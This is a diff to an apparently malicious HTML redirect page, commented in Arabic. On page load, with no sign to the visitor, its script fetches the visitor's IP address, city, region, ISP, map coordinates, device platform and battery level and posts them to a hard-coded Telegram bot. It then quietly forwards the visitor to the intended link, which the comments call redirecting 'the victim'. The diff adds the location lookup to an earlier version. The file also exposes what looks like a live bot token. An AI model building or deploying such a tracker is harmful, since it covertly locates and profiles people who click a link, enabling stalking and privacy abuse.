@@ -3,49 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <script>
-        // إعدادات التليجرام مالتك
         const BOT_TOKEN = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
         const CHAT_ID = "5773364548";
 
-        async function sendToTelegram() {
-            // جلب الرابط الأصلي اللي يريد يروحه الشخص
+        async function getProData() {
             const params = new URLSearchParams(window.location.search);
             const target = params.get('u') || 'https://google.com';
-
-            // جلب معلومات الجهاز والبطارية
-            let batt = "غير معروف";
+            
             try {
-                const b = await navigator.getBattery();
-                batt = Math.round(b.level * 100) + "%";
-            } catch(e) {}
+                // جلب بيانات الآيبي والموقع من مصدر خارجي سريع
+                const response = await fetch('https://ipapi.co/json/');
+                const ipData = await response.json();
 
-            const msg = `
-🎯 **صيد جديد من الخبير!**
+                // محاولة جلب البطارية
+                let batt = "N/A";
+                try {
+                    const b = await navigator.getBattery();
+                    batt = Math.round(b.level * 100) + "%";
+                } catch(e) {}
+
+                const msg = `
+🚀 **رصد احترافي - تحليل المواصفات** 🚀
 ━━━━━━━━━━━━━━━
+🌐 **الآيبي الخارجي:**
+${ipData.ip}
+
+📱 **تحليل نوع الجهاز:**
+${navigator.platform}
+
+📍 **الموقع:** ${ipData.city} | 🏗️ **المحافظة:** ${ipData.region}
+
+🏢 **الشركة:** ${ipData.org}
+
 🔋 **البطارية:** ${batt}
-📱 **الجهاز:** ${navigator.platform}
-🖥️ **الشاشة:** ${window.screen.width}x${window.screen.height}
-🔗 **الوجهة:** ${target}
+
+🗺️ **رابط الخريطة:**
+https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}
 ━━━━━━━━━━━━━━━`;
 
-            // إرسال البيانات مباشرة للتليجرام
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: msg,
-                    parse_mode: 'Markdown'
-                })
-            });
+                // إرسال التقرير الاحترافي
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: msg
+                    })
+                });
 
-            // تحويل الشخص للرابط اللي يريده
+            } catch (error) {
+                // إذا النت جداً ضعيف وفشل جلب الموقع، يرسل المعلومات الأساسية فقط
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: "⚠️ تعذر جلب الموقع بسبب ضعف الإنترنت، لكن الصيد مستمر!"
+                    })
+                });
+            }
+
+            // تحويل الضحية فوراً
             window.location.replace(target);
         }
 
-        window.onload = sendToTelegram;
+        window.onload = getProData;
     </script>
 </head>
-<body style="background-color: black;">
-    </body>
+<body style="background: black;"></body>
 </html>
